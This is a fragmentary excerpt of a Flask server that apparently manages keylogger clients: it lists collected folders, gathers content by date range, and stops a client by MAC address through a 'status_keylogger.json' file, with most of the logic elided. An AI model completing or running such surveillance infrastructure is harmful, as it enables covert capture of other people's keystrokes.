...
app = Flask(__name__)
CORS(app)
data_file = r"C:\Users\matan\kodkod\programming\pppp\server"
...
@login_required
def get_folders():
    base_dir = r"C:\Users\matan\kodkod\programming\pppp\server"
    try:
...
def collect_content_between_files_in_folder( folder_name, from_date, last_date):
    folder_path = rf"C:\Users\matan\kodkod\programming\pppp\server\{folder_name}"
...
def stop_by_mac_address(mac_address):
    file_path = r"C:\Users\matan\kodkod\programming\pppp\server\files\status_keylogger.json"
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
